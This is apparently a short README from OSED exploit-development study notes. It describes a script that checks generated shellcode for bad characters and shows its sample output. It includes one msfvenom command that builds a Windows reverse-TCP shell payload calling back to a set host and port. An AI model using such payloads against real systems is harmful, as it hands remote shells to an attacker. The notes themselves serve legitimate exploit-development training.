# OSED_Notes

## badchars_find.py
A python script that finds badchars inside generated shellcodes by dividing the shellcode into blocks of \x70 bytes of length


```bash
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.1 lport=443 -f python EXITFUNC=thread -v buf

username@host:~$ python3 badchars_find.py
Badchar found: 0x3
Badchar: 0
==============================
Badchar found: 0x4
Badchar: 0
==============================
Badchar found: 0x5
Badchar: 0
==============================
Badchar found: 0x17
Badchar: 40
==============================
...
==============================
Badchar found: 0x55
Badchar: 128
==============================
Badchar found: 0x60
Badchar: 0
==============================
[!] Third block: 22 badchars! [!]
==============================
```
